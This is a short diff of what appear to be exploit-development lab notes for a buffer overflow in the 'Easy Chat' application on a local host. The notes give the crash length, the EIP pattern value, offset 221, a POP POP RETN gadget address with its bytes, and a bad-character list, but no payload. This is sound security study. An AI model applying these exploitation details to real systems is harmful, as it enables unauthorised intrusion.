@@ -1,0 +1,23 @@
+APP :  Easy Chat
+
+IP : 192.168.0.134
+
+Port: 80 
+
+
+1. Finding Crash with fuzzzzing script  buffer crash at 500
+
+2. Send pattetn of 500 and find EIp =>34684133
+
+3. Calculating Offset 221
+
+4. Checking OFfset
+
+5. Finding POP POP RETN => POP r32 POP r32 RETN 
+{
+	1000227F   5D               POP EBP  (\x7f\x22\x00\x10)
+    10002280   5B               POP EBX
+    10002281   C3               RETN
+}
+
+6. Finding Bad Char \x00\x20\x0a\x0d
